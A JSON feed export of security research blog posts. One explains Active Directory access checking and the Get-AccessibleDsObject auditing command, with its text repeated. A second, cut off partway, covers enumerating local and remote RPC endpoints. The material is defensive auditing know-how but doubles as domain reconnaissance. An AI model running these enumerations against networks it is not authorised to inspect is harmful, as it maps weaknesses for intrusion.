{"articles": [{"id": "tag:blogger.com,1999:blog-4304739697716191998.post-995270600715757912", "guidislink": true, "link": "https://www.tiraniddo.dev/2022/07/access-checking-active-directory.html", "published": "2022-07-16T21:49:00.003-07:00", "published_parsed": [2022, 7, 17, 4, 49, 0, 6, 198, 0], "updated": "2023-02-01T13:00:42.342-08:00", "updated_parsed": [2023, 2, 1, 21, 0, 42, 2, 32, 0], "title": "Access Checking Active Directory", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Access Checking Active Directory"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>Like many Windows related technologies Active Directory uses a security descriptor and the access check process to determine what access a user has to parts of the directory. Each object in the directory contains an <a href=\"https://docs.microsoft.com/en-us/windows/win32/adschema/a-ntsecuritydescriptor\">nTSecurityDescriptor</a> attribute which stores the binary representation of the security descriptor. When a user accesses the object through LDAP the remote user's token is used with the security descriptor to determine if they have the rights to perform the operation they're requesting.</p><p>Weak security descriptors is a common misconfiguration that could result in the entire domain being compromised. Therefore it's important for an administrator to be able to find and remediate security weaknesses. Unfortunately Microsoft doesn't provide a means for an administrator to audit the security of AD, at least in any default tool I know of. There is third-party tooling, such as <a href=\"https://github.com/BloodHoundAD\">Bloodhound</a>, which will perform this analysis offline but from reading the implementation of the checking they don't tend to use the real access check APIs and so likely miss some misconfigurations.</p><p>I wrote my own <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/Cmdlets/Accessible/GetAccessibleDsObject.cs\">access checker</a> for AD which is included in my <a href=\"https://www.powershellgallery.com/packages/NtObjectManager\">NtObjectManager</a> PowerShell module. I've used it to find a few vulnerabilities, such as&nbsp;<a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2186\">CVE-2021-34470</a> which was an issue with Exchange's changes to AD. This works \"online\", as in you need to have an active account in the domain to run it, however AFAIK it should provide the most accurate results if what you're interested in what access an specific user has to AD objects. While the command is available in the module it's perhaps not immediately obvious how to use it an interpret the result, therefore I decide I should write a quick blog post about it.</p><h3 style=\"text-align: left;\">A Complex Process</h3><div>The access check process is mostly documented by Microsoft in&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/d2435927-0999-4c62-8c6d-13ba31a52e1a\">[MS-ADTS]: Active Directory Technical Specification</a>. Specifically in section&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e11a7e6-e18c-46e4-a781-3ca2b4de6f30\">5.1.3</a>. However, this leaves many questions unanswered. I'm not going to go through how it works in full either, but let me give a quick overview.&nbsp; I'm going to assume you have a basic knowledge of the structure of the AD and its objects.</div><div><br /></div><div>An AD object contains many resources that access might want to be granted or denied on for a particular user. For example you might want to allow the user to create only certain types of child objects, or only modify certain attributes. There are many ways that Microsoft could have implemented security, but they decided on extending the ACL format to introduce the object ACE. For example the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_object_ace\">ACCESS_ALLOWED_OBJECT_ACE</a> structure adds two GUIDs to the normal <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace\">ACCESS_ALLOWED_ACE</a>.&nbsp;</div><div><br /></div><div>The first GUID, <i>ObjectType</i> indicates the type of object that the ACE applies to. For example this can be set to the schema ID of an attribute and the ACE will grant access to only that attribute nothing else. The second GUID,&nbsp;<i>InheritedObjectType</i> is only used during ACL inheritance. It represents the schema ID of the object's class that is allowed to inherit this ACE. For example if it's set to the schema ID of the <i>computer</i> class, then the ACE will only be inherited if such a class is created, it will not be if say a <i>user </i>object is created instead. We only need to care about the first of these GUIDs when doing an access check.</div><div><br /></div><div>To perform an access check you need to use an API such as&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-accesscheckbytype\">AccessCheckByType</a> which supports checking the object ACEs. When calling the API you pass a list of object type GUIDs you want to check for access on. When processing the DACL if an ACE has an&nbsp;<i>ObjectType</i>&nbsp;GUID which isn't in the passed list it'll be ignored. Otherwise it'll be handled according to the normal access check rules. If the ACE isn't an object ACE then it'll also be processed.</div><div><br /></div><div>If all you want to do is check if a local user has access to a specific object or attribute then it's pretty simple. Just get the access token for that user, add the object's GUID to the list and call the access check API. The resulting granted access can be one of the following specific access rights, not the names in parenthesis are the ones I use in the PowerShell module for simplicity:</div><div><ul style=\"text-align: left;\"><li><i>ACTRL_DS_CREATE_CHILD (CreateChild)</i>&nbsp;- Create a new child object</li><li><i>ACTRL_DS_DELETE_CHILD (DeleteChild)</i> - Delete a child object</li><li><i>ACTRL_DS_LIST (List)</i> - Enumerate child objects</li><li><i>ACTRL_DS_SELF (Self)</i> - Grant a write-validated extended right</li><li><i>ACTRL_DS_READ_PROP (ReadProp)</i> - Read an attribute</li><li><i>ACTRL_DS_WRITE_PROP (WriteProp)</i> - Write an attribute</li><li><i>ACTRL_DS_DELETE_TREE (DeleteTree)</i> - Delete a tree of objects</li><li><i>ACTRL_DS_LIST_OBJECT (ListObject)</i> - List a tree of objects</li><li><i>ACTRL_DS_CONTROL_ACCESS (ControlAccess)</i>&nbsp;- Grant a control extended right</li></ul></div><div>You can also be granted standard rights such as <i>READ_CONTROL</i>, <i>WRITE_DAC</i> or <i>DELETE</i> which do what you'd expect them to do. However, if you want see what the maximum granted access on the DC would be it's slightly more difficult. We have the following problems:</div><div><ul style=\"text-align: left;\"><li>The list of groups granted to a local user is unlikely to match what they're granted on the DC where the real access check takes place.</li><li><i>AccessCheckByType</i> only returns a single granted access value, if we have a lot of object types to test it'd be quick expensive to call 100s if not 1000s of times for a single security descriptor.</li></ul><div>While you could solve the first problem by having sufficient local privileges to manually create an access token and the second by using an API which returns a list of granted access such as&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzaccesscheck\">AccessCheckByTypeResultList</a> there's an \"simpler\" solution. You can use the Authz APIs, these allow you to manually build a security context with any groups you like without needing to create an access token and the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzaccesscheck\">AuthzAccessCheck</a> API supports returning a list of granted access for each object in the type list. It just so happens that this API is the one used by the AD LDAP server itself.</div></div><div><br /></div><div>Therefore to perform a \"correct\" maximum access check you need to do the following steps.</div><div><ol style=\"text-align: left;\"><li>Enumerate the user's group list for the DC from the AD. Local group assignments are stored in the directory's <i>CN=Builtin</i> container.</li><li>Build an Authz security context with the group list.</li><li>Read a directory object's security descriptor.</li><li>Read the object's schema class and build a list of specific schema objects to check:</li><ul><li>All attributes from the class and its super, auxiliary and dynamic auxiliary classes.</li><li>All allowable child object classes</li><li>All assignable control, write-validated and property set extended rights.</li></ul><li>Convert the gathered schema information into the object type list for the access check.</li><li>Run the access check and handled the results.</li><li>Repeat from 3 for every object you want to check.</li></ol></div><div>Trust me when I say this process is actually easier said than done. There's many nuances that just produce surprising results, I guess this is why most tooling just doesn't bother. Also my code includes a fair amount of knowledge gathered from reverse engineering the real implementation, but I'm sure I could have missed something.</div><div><br /></div><h3 style=\"text-align: left;\">Using Get-AccessibleDsObject and Interpreting the Results</h3><div>Let's finally get to using the PowerShell command which is the real purpose of this blog post. For a simple check run the following command. This can take a while on the first run to gather information about the domain and the user.</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-AccessibleDsObject -NamingContext Default</span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp;ObjectClass UserName&nbsp; &nbsp; &nbsp; &nbsp;Modifiable Controllable</span></div><div><span style=\"font-family: courier;\">----&nbsp; &nbsp;----------- --------&nbsp; &nbsp; &nbsp; &nbsp;---------- ------------</span></div><div><span style=\"font-family: courier;\">domain domainDNS&nbsp; &nbsp;DOMAIN\\alice&nbsp; &nbsp;False&nbsp; &nbsp; &nbsp; True</span></div></div><div><br /></div><div>This uses the <i>NamingContext</i> property to specify what object to check. The property allows you to easily specify the three main directories, <i>Default</i>, <i>Configuration</i> and <i>Schema</i>. You can also use the <i>DistinguishedName</i> property to specify an explicit DN. Also the&nbsp;<i>Domain </i>property is used to specify the domain for the LDAP server if you don't want to inspect the current user's domain. You can also specify the <i>Recurse </i>property to recursively enumerate objects, in this case we just access check the root object.</div><div><br /></div><div>The access check defaults to using the current user's groups, based on what they would be on the DC. This is obviously important, especially if the current user is a local administrator as they wouldn't be guaranteed to have administrator rights on the DC. You can specify different users to check either by SID using the <i>UserSid</i> property, or names using the <i>UserName</i> property. These properties can take multiple values which will run multiple checks against the list of enumerated objects. For example to check using the domain administrator you could do the following:</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-AccessibleDsObject -NamingContext Default -UserName DOMAIN\\Administrator</span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp;ObjectClass UserName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Modifiable Controllable</span></div><div><span style=\"font-family: courier;\">----&nbsp; &nbsp;----------- --------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---------- ------------</span></div><div><span style=\"font-family: courier;\">domain domainDNS&nbsp; &nbsp;DOMAIN\\Administrator True&nbsp; &nbsp; &nbsp; &nbsp;True</span></div></div><div><br /></div><div>The basic table format for the access check results shows give columns, the common name of the object, it's schema class, the user that was checked and whether the access check resulted in any modifiable or controllable access being granted. <i>Modifiable </i>is things like being able to write attributes or create/delete child objects. <i>Controllable </i>indicates one or more controllable extended right was granted to the user, such as allowing the user's password to be changed.</div><div><br /></div><div>As this is PowerShell the access check result is an object with many properties. The following properties are probably the ones of most interest when determining what access is granted to the user.</div><div><ul style=\"text-align: left;\"><li><i>GrantedAccess</i> - The granted access when only specifying the object's schema class during the check. If an access is granted at this level it'd apply to all values of that type, for example if&nbsp;<i>WriteProp</i>&nbsp;is granted then any attribute in the object can be written by the user.</li><li><i>WritableAttributes </i>- The list of attributes a user can modify.</li><li><i>WritablePropertySets </i>- The list of writable property sets a user can modify. Note that this is more for information purposes, the modifiable attributes will also be in the <i>WritableAttributes </i>property which is going to be easier to inspect.</li><li><i>GrantedControl </i>- The list of control extended rights granted to a user.</li><li><i>GrantedWriteValidated </i>- The list of write validated extended rights granted to a user.</li><li><i>CreateableClasses </i>- The list of child object classes that can be created.</li><li><i>DeletableClasses </i>- The list of child object classes that can be deleted.</li><li><i>DistinguishedName&nbsp;</i>- The full DN of the object.</li><li><i>SecurityDescriptor</i> - The security descriptor used for the check.</li><li><i>TokenInfo </i>- The user's information used in the check, such as the list of groups.</li></ul></div><div>The command should be pretty easy to use. That said it does come with a few caveats. First you can only use the command with direct access to the AD using a domain account. Technically there's no reason you couldn't implement a gatherer like Bloodhound and doing the access check offline, but I just don't. I've not tested it in weirder setups such as complex domain hierarchies or RODCs.</div><div><br /></div><div>If you're using a low-privileged user there's likely to be AD objects that you can't enumerate or read the security descriptor from. This means the results are going to depend on the user you use to enumerate with. The best results would be using a domain/enterprise administrator will full access to everything.</div><div><br /></div><div>Based on my testing when I've found an access being granted to a user that seems to be real, however it's possible I'm not always 100% correct or that I'm missing accesses. Also it's worth noting that just having access doesn't mean there's not some extra checking done by the LDAP server. For example there's an explicit block on creating <a href=\"https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview\">Group Managed Service Accounts</a> in <i>Computer </i>objects, even though that will seem to be a granted child object.</div>"}], "summary": "<p>Like many Windows related technologies Active Directory uses a security descriptor and the access check process to determine what access a user has to parts of the directory. Each object in the directory contains an <a href=\"https://docs.microsoft.com/en-us/windows/win32/adschema/a-ntsecuritydescriptor\">nTSecurityDescriptor</a> attribute which stores the binary representation of the security descriptor. When a user accesses the object through LDAP the remote user's token is used with the security descriptor to determine if they have the rights to perform the operation they're requesting.</p><p>Weak security descriptors is a common misconfiguration that could result in the entire domain being compromised. Therefore it's important for an administrator to be able to find and remediate security weaknesses. Unfortunately Microsoft doesn't provide a means for an administrator to audit the security of AD, at least in any default tool I know of. There is third-party tooling, such as <a href=\"https://github.com/BloodHoundAD\">Bloodhound</a>, which will perform this analysis offline but from reading the implementation of the checking they don't tend to use the real access check APIs and so likely miss some misconfigurations.</p><p>I wrote my own <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/Cmdlets/Accessible/GetAccessibleDsObject.cs\">access checker</a> for AD which is included in my <a href=\"https://www.powershellgallery.com/packages/NtObjectManager\">NtObjectManager</a> PowerShell module. I've used it to find a few vulnerabilities, such as&nbsp;<a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2186\">CVE-2021-34470</a> which was an issue with Exchange's changes to AD. This works \"online\", as in you need to have an active account in the domain to run it, however AFAIK it should provide the most accurate results if what you're interested in what access an specific user has to AD objects. While the command is available in the module it's perhaps not immediately obvious how to use it an interpret the result, therefore I decide I should write a quick blog post about it.</p><h3 style=\"text-align: left;\">A Complex Process</h3><div>The access check process is mostly documented by Microsoft in&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/d2435927-0999-4c62-8c6d-13ba31a52e1a\">[MS-ADTS]: Active Directory Technical Specification</a>. Specifically in section&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e11a7e6-e18c-46e4-a781-3ca2b4de6f30\">5.1.3</a>. However, this leaves many questions unanswered. I'm not going to go through how it works in full either, but let me give a quick overview.&nbsp; I'm going to assume you have a basic knowledge of the structure of the AD and its objects.</div><div><br /></div><div>An AD object contains many resources that access might want to be granted or denied on for a particular user. For example you might want to allow the user to create only certain types of child objects, or only modify certain attributes. There are many ways that Microsoft could have implemented security, but they decided on extending the ACL format to introduce the object ACE. For example the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_object_ace\">ACCESS_ALLOWED_OBJECT_ACE</a> structure adds two GUIDs to the normal <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace\">ACCESS_ALLOWED_ACE</a>.&nbsp;</div><div><br /></div><div>The first GUID, <i>ObjectType</i> indicates the type of object that the ACE applies to. For example this can be set to the schema ID of an attribute and the ACE will grant access to only that attribute nothing else. The second GUID,&nbsp;<i>InheritedObjectType</i> is only used during ACL inheritance. It represents the schema ID of the object's class that is allowed to inherit this ACE. For example if it's set to the schema ID of the <i>computer</i> class, then the ACE will only be inherited if such a class is created, it will not be if say a <i>user </i>object is created instead. We only need to care about the first of these GUIDs when doing an access check.</div><div><br /></div><div>To perform an access check you need to use an API such as&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-accesscheckbytype\">AccessCheckByType</a> which supports checking the object ACEs. When calling the API you pass a list of object type GUIDs you want to check for access on. When processing the DACL if an ACE has an&nbsp;<i>ObjectType</i>&nbsp;GUID which isn't in the passed list it'll be ignored. Otherwise it'll be handled according to the normal access check rules. If the ACE isn't an object ACE then it'll also be processed.</div><div><br /></div><div>If all you want to do is check if a local user has access to a specific object or attribute then it's pretty simple. Just get the access token for that user, add the object's GUID to the list and call the access check API. The resulting granted access can be one of the following specific access rights, not the names in parenthesis are the ones I use in the PowerShell module for simplicity:</div><div><ul style=\"text-align: left;\"><li><i>ACTRL_DS_CREATE_CHILD (CreateChild)</i>&nbsp;- Create a new child object</li><li><i>ACTRL_DS_DELETE_CHILD (DeleteChild)</i> - Delete a child object</li><li><i>ACTRL_DS_LIST (List)</i> - Enumerate child objects</li><li><i>ACTRL_DS_SELF (Self)</i> - Grant a write-validated extended right</li><li><i>ACTRL_DS_READ_PROP (ReadProp)</i> - Read an attribute</li><li><i>ACTRL_DS_WRITE_PROP (WriteProp)</i> - Write an attribute</li><li><i>ACTRL_DS_DELETE_TREE (DeleteTree)</i> - Delete a tree of objects</li><li><i>ACTRL_DS_LIST_OBJECT (ListObject)</i> - List a tree of objects</li><li><i>ACTRL_DS_CONTROL_ACCESS (ControlAccess)</i>&nbsp;- Grant a control extended right</li></ul></div><div>You can also be granted standard rights such as <i>READ_CONTROL</i>, <i>WRITE_DAC</i> or <i>DELETE</i> which do what you'd expect them to do. However, if you want see what the maximum granted access on the DC would be it's slightly more difficult. We have the following problems:</div><div><ul style=\"text-align: left;\"><li>The list of groups granted to a local user is unlikely to match what they're granted on the DC where the real access check takes place.</li><li><i>AccessCheckByType</i> only returns a single granted access value, if we have a lot of object types to test it'd be quick expensive to call 100s if not 1000s of times for a single security descriptor.</li></ul><div>While you could solve the first problem by having sufficient local privileges to manually create an access token and the second by using an API which returns a list of granted access such as&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzaccesscheck\">AccessCheckByTypeResultList</a> there's an \"simpler\" solution. You can use the Authz APIs, these allow you to manually build a security context with any groups you like without needing to create an access token and the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzaccesscheck\">AuthzAccessCheck</a> API supports returning a list of granted access for each object in the type list. It just so happens that this API is the one used by the AD LDAP server itself.</div></div><div><br /></div><div>Therefore to perform a \"correct\" maximum access check you need to do the following steps.</div><div><ol style=\"text-align: left;\"><li>Enumerate the user's group list for the DC from the AD. Local group assignments are stored in the directory's <i>CN=Builtin</i> container.</li><li>Build an Authz security context with the group list.</li><li>Read a directory object's security descriptor.</li><li>Read the object's schema class and build a list of specific schema objects to check:</li><ul><li>All attributes from the class and its super, auxiliary and dynamic auxiliary classes.</li><li>All allowable child object classes</li><li>All assignable control, write-validated and property set extended rights.</li></ul><li>Convert the gathered schema information into the object type list for the access check.</li><li>Run the access check and handled the results.</li><li>Repeat from 3 for every object you want to check.</li></ol></div><div>Trust me when I say this process is actually easier said than done. There's many nuances that just produce surprising results, I guess this is why most tooling just doesn't bother. Also my code includes a fair amount of knowledge gathered from reverse engineering the real implementation, but I'm sure I could have missed something.</div><div><br /></div><h3 style=\"text-align: left;\">Using Get-AccessibleDsObject and Interpreting the Results</h3><div>Let's finally get to using the PowerShell command which is the real purpose of this blog post. For a simple check run the following command. This can take a while on the first run to gather information about the domain and the user.</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-AccessibleDsObject -NamingContext Default</span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp;ObjectClass UserName&nbsp; &nbsp; &nbsp; &nbsp;Modifiable Controllable</span></div><div><span style=\"font-family: courier;\">----&nbsp; &nbsp;----------- --------&nbsp; &nbsp; &nbsp; &nbsp;---------- ------------</span></div><div><span style=\"font-family: courier;\">domain domainDNS&nbsp; &nbsp;DOMAIN\\alice&nbsp; &nbsp;False&nbsp; &nbsp; &nbsp; True</span></div></div><div><br /></div><div>This uses the <i>NamingContext</i> property to specify what object to check. The property allows you to easily specify the three main directories, <i>Default</i>, <i>Configuration</i> and <i>Schema</i>. You can also use the <i>DistinguishedName</i> property to specify an explicit DN. Also the&nbsp;<i>Domain </i>property is used to specify the domain for the LDAP server if you don't want to inspect the current user's domain. You can also specify the <i>Recurse </i>property to recursively enumerate objects, in this case we just access check the root object.</div><div><br /></div><div>The access check defaults to using the current user's groups, based on what they would be on the DC. This is obviously important, especially if the current user is a local administrator as they wouldn't be guaranteed to have administrator rights on the DC. You can specify different users to check either by SID using the <i>UserSid</i> property, or names using the <i>UserName</i> property. These properties can take multiple values which will run multiple checks against the list of enumerated objects. For example to check using the domain administrator you could do the following:</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-AccessibleDsObject -NamingContext Default -UserName DOMAIN\\Administrator</span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp;ObjectClass UserName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Modifiable Controllable</span></div><div><span style=\"font-family: courier;\">----&nbsp; &nbsp;----------- --------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---------- ------------</span></div><div><span style=\"font-family: courier;\">domain domainDNS&nbsp; &nbsp;DOMAIN\\Administrator True&nbsp; &nbsp; &nbsp; &nbsp;True</span></div></div><div><br /></div><div>The basic table format for the access check results shows give columns, the common name of the object, it's schema class, the user that was checked and whether the access check resulted in any modifiable or controllable access being granted. <i>Modifiable </i>is things like being able to write attributes or create/delete child objects. <i>Controllable </i>indicates one or more controllable extended right was granted to the user, such as allowing the user's password to be changed.</div><div><br /></div><div>As this is PowerShell the access check result is an object with many properties. The following properties are probably the ones of most interest when determining what access is granted to the user.</div><div><ul style=\"text-align: left;\"><li><i>GrantedAccess</i> - The granted access when only specifying the object's schema class during the check. If an access is granted at this level it'd apply to all values of that type, for example if&nbsp;<i>WriteProp</i>&nbsp;is granted then any attribute in the object can be written by the user.</li><li><i>WritableAttributes </i>- The list of attributes a user can modify.</li><li><i>WritablePropertySets </i>- The list of writable property sets a user can modify. Note that this is more for information purposes, the modifiable attributes will also be in the <i>WritableAttributes </i>property which is going to be easier to inspect.</li><li><i>GrantedControl </i>- The list of control extended rights granted to a user.</li><li><i>GrantedWriteValidated </i>- The list of write validated extended rights granted to a user.</li><li><i>CreateableClasses </i>- The list of child object classes that can be created.</li><li><i>DeletableClasses </i>- The list of child object classes that can be deleted.</li><li><i>DistinguishedName&nbsp;</i>- The full DN of the object.</li><li><i>SecurityDescriptor</i> - The security descriptor used for the check.</li><li><i>TokenInfo </i>- The user's information used in the check, such as the list of groups.</li></ul></div><div>The command should be pretty easy to use. That said it does come with a few caveats. First you can only use the command with direct access to the AD using a domain account. Technically there's no reason you couldn't implement a gatherer like Bloodhound and doing the access check offline, but I just don't. I've not tested it in weirder setups such as complex domain hierarchies or RODCs.</div><div><br /></div><div>If you're using a low-privileged user there's likely to be AD objects that you can't enumerate or read the security descriptor from. This means the results are going to depend on the user you use to enumerate with. The best results would be using a domain/enterprise administrator will full access to everything.</div><div><br /></div><div>Based on my testing when I've found an access being granted to a user that seems to be real, however it's possible I'm not always 100% correct or that I'm missing accesses. Also it's worth noting that just having access doesn't mean there's not some extra checking done by the LDAP server. For example there's an explicit block on creating <a href=\"https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview\">Group Managed Service Accounts</a> in <i>Computer </i>objects, even though that will seem to be a granted child object.</div>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/995270600715757912"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/995270600715757912"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2022/07/access-checking-active-directory.html", "title": "Access Checking Active Directory"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-3144647968364694402", "guidislink": true, "link": "https://www.tiraniddo.dev/2022/06/finding-running-rpc-server-information.html", "published": "2022-06-26T14:56:00.000-07:00", "published_parsed": [2022, 6, 26, 21, 56, 0, 6, 177, 0], "updated": "2022-06-26T14:56:00.104-07:00", "updated_parsed": [2022, 6, 26, 21, 56, 0, 6, 177, 0], "title": "Finding Running RPC Server Information with NtObjectManager", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Finding Running RPC Server Information with NtObjectManager"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>When doing security research I regularly use my <a href=\"https://www.powershellgallery.com/packages/NtObjectManager\">NtObjectManager PowerShell module</a> to discover and call RPC servers on Windows. Typically I'll use the <i>Get-RpcServer</i> command, passing the name of a DLL or EXE file to extract the embedded RPC servers. I can then use the returned server objects to create a client to access the server and call its methods. A <a href=\"https://clearbluejar.github.io/posts/from-ntobjectmanager-to-petitpotam/\">good blog post</a> about how some of this works was written recently by <a href=\"https://twitter.com/clearbluejar\">blueclearjar</a>.</p><p>Using <i>Get-RpcServer</i> only gives you a list of what RPC servers could possibly be running, not whether they are running and if so in what process. This is where the&nbsp;<a href=\"https://github.com/silverf0x/RpcView\">RpcView</a> does better, as it parses a process' in-memory RPC structures to find what is registered and where. Unfortunately this is something that I'm yet to implement in <i>NtObjectManager</i>.&nbsp;</p><p>However, it turns out there's various ways to get the running RPC server information which are provided by OS and the RPC runtime which we can use to get a more or less complete list of running servers. I've exposed all the ones I know about with some recent updates to the module. Let's go through the various ways you can piece together this information.</p><p>NOTE some of the examples of PowerShell code will need a recent build of the <i>NtObjectManager </i>module. For various reasons I've not been updating the version of the PS gallery, so get the source code from <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools\">github</a> and build it yourself.</p><h3 style=\"text-align: left;\">RPC Endpoint Mapper</h3><p style=\"text-align: left;\">If you're lucky this is simplest way to find out if a particular RPC server is running. When an RPC server is started the service can register an RPC interface with the function&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcepregisterw\">RpcEpRegister</a> specifying the interface UUID and version along with the binding information with the RPC endpoint mapper service running in RPCSS. This registers all current RPC endpoints the server is listening on keyed against the RPC interface.&nbsp;</p><p style=\"text-align: left;\">You can query the endpoint table using the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtepeltinqbegin\">RpcMgmtEpEltInqBegin</a> and&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtepeltinqnext\">RpcMgmtEpEltInqNext</a> APIs. I expose this through the <i>Get-RpcEndpoint</i> command. Running&nbsp;<i>Get-RpcEndpoint</i>&nbsp;with no parameters returns all interfaces the local endpoint mapper knows about as shown below.</p><div><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint</span></div><div><div><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version Protocol&nbsp; &nbsp; &nbsp;Endpoint&nbsp; &nbsp; &nbsp; Annotation</span></div><div><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;------- --------&nbsp; &nbsp; &nbsp;--------&nbsp; &nbsp; &nbsp; ----------</span></div><div><span style=\"font-family: courier; font-size: x-small;\">51a227ae-825b-41f2-b4a9-1ac9557a1018 1.0&nbsp; &nbsp; &nbsp;ncacn_ip_tcp 49669&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">0497b57d-2e66-424f-a0c6-157cd5d41700 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; &nbsp; &nbsp; LRPC-5f43...&nbsp; AppInfo</span></div><div><span style=\"font-family: courier; font-size: x-small;\">201ef99a-7fa0-444c-9399-19ba84f12a1a 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; &nbsp; &nbsp; LRPC-5f43...&nbsp; AppInfo</span></div></div><div><span style=\"font-family: courier; font-size: x-small;\">...</span></div><p style=\"text-align: left;\">Note that in addition to the interface UUID and version the output shows the binding information for the endpoint, such as the protocol sequence and endpoint. There is also a free form annotation field, but that can be set to anything the server likes when it calls <i>RpcEpRegister</i>.</p><p style=\"text-align: left;\">The APIs also allow you to specify a remote server hosting the endpoint mapper. You can use this to query what RPC servers are running on a remote server, assuming the firewall doesn't block you. To do this you'd need to specify a binding string for the <i>SearchBinding </i>parameter as shown.</p><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint -SearchBinding 'ncacn_ip_tcp:primarydc'</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version Protocol&nbsp; &nbsp; &nbsp;Endpoint&nbsp; &nbsp; &nbsp;Annotation<br />----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;------- --------&nbsp; &nbsp; &nbsp;--------&nbsp; &nbsp; &nbsp;----------<br />d95afe70-a6d5-4259-822e-2c84da1ddb0d 1.0&nbsp; &nbsp; &nbsp;ncacn_ip_tcp 49664<br />5b821720-f63b-11d0-aad2-00c04fc324db 1.0&nbsp; &nbsp; &nbsp;ncacn_ip_tcp 49688<br />650a7e26-eab8-5533-ce43-9c1dfce11511 1.0&nbsp; &nbsp; &nbsp;ncacn_np&nbsp; &nbsp; &nbsp;\\PIPE\\ROUTER Vpn APIs<br />...</span></div><p style=\"text-align: left;\">The big issue with the RPC endpoint mapper is it only contains RPC interfaces which were explicitly registered against an endpoint. The server could contain many more interfaces which could be accessible, but as they weren't registered they won't be returned from the endpoint mapper. Registration will typically only be used if the server is using an ephemeral name for the endpoint, such as a random TCP port or auto-generated ALPC name.</p><p style=\"text-align: left;\"><b>Pros:</b></p><p style=\"text-align: left;\"></p><ul style=\"text-align: left;\"><li>Simple command 